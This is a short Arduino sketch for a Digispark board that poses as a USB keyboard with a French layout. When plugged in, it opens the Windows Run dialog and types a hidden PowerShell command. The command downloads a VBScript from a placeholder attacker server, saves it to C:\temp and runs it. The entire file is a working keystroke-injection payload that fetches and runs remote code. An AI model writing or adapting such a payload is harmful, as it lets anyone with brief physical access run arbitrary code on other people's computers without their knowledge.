#include "DigiKeyboardFr.h"

void setup() {
}

void loop() {
  DigiKeyboardFr.sendKeyStroke(0);
  DigiKeyboardFr.sendKeyStroke(KEY_FR_R,MOD_GUI_LEFT); //Open the Run dialog box
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.print("powershell.exe -windowstyle hidden -command Invoke-WebRequest \"http://<SERVER_IP>:<SERVER_PORT>/s.vbs\" -OutFile \"C:\\temp\\s.vbs\"; wscript \"C:\\temp\\s.vbs\" | Invoke-Expression");
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  for(;;){}
}
